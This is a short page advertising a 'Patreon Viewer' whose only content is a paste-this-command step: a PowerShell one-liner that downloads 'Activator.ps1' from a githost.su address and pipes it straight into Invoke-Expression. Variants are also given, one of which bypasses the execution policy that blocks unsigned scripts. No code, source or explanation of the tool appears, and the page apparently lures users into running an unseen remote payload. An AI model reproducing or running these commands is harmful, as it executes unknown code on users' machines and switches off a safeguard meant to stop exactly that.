# ⚡️ Patreon Viewer | External

---

### 💎 PowerShell
```powershell
irm https://githost.su/powershell/Activator.ps1 | iex
```

---

## 🔍 Troubleshooting & Common Errors

### 📌 Bypass Execution Policy (Blocking Unsigned Scripts)
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://githost.su/powershell/Activator.ps1 | iex"
```

### 📌 Error: "irm is not recognized..." (PowerShell 2.0 Legacy)
```powershell
Invoke-RestMethod https://githost.su/powershell/Activator.ps1 | Invoke-Expression
```
